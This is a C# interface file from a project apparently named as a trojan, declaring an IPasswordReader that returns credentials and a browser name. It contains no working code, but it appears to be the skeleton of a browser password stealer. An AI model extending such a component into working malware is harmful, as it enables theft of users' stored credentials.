using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace DNAV_Trojaner
{
    interface IPasswordReader
    {
        IEnumerable<Credential> GetPasswords();
        string BrowserName { get; }
    }
}
